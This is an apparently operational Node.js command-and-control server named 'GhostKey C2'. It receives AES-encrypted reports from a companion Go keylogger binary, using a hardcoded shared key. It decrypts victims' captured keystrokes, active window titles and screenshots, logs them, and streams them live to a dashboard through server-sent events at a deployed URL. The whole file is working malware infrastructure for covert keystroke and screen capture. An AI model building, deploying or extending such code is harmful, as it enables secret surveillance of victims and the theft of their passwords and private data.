const express = require('express');
const CryptoJS = require('crypto-js');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";  // ←←← SAME AS GO BINARY

app.use(cors());
app.use(bodyParser.json({ limit: '20mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Explicit root route (critical for Render)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// SSE clients
const clients = [];

app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  res.write(': connected\n\n');
  clients.push(res);

  req.on('close', () => {
    clients.splice(clients.indexOf(res), 1);
  });
});

function broadcast(data) {
  clients.forEach(client => {
    try {
      client.write(`data: ${JSON.stringify(data)}\n\n`);
    } catch (e) { /* ignore dead clients */ }
  });
}

// Decrypt exactly like Go binary (AES-CBC + PKCS7 + IV prepended)
function decrypt(b64) {
  try {
    const raw = CryptoJS.enc.Base64.parse(b64);
    const iv = CryptoJS.enc.Base64.stringify(raw.clone().splice(0, 16));
    const ciphertext = CryptoJS.enc.Base64.stringify(raw.clone().splice(16));

    const decrypted = CryptoJS.AES.decrypt(ciphertext, CryptoJS.enc.Utf8.parse(AES_KEY), {
      iv: CryptoJS.enc.Base64.parse(iv),
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7
    });
    return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
  } catch (e) {
    console.log("Decrypt failed:", e.message);
    return null;
  }
}

// Main C2 endpoint
app.post('/ghost', (req, res) => {
  const payload = decrypt(req.body.data);
  if (payload) {
    console.log(`[+] ${payload.Client} | ${payload.Window} | ${payload.Keys?.length || 0} keys${payload.Screenshot ? ' + screenshot' : ''}`);
    broadcast(payload);  // ← sends raw payload with correct capital letters
  }
  res.json({ success: true });
});

// Legacy fallback
app.post('/log', (req, res) => res.json({ success: true }));

// 404 fallback
app.use((req, res) => {
  res.status(404).send("GhostKey C2 — No route");
});

app.listen(PORT, () => {
  console.log(`GhostKey Dashboard LIVE → https://fs-tracker-online-ghost.onrender.com`);
});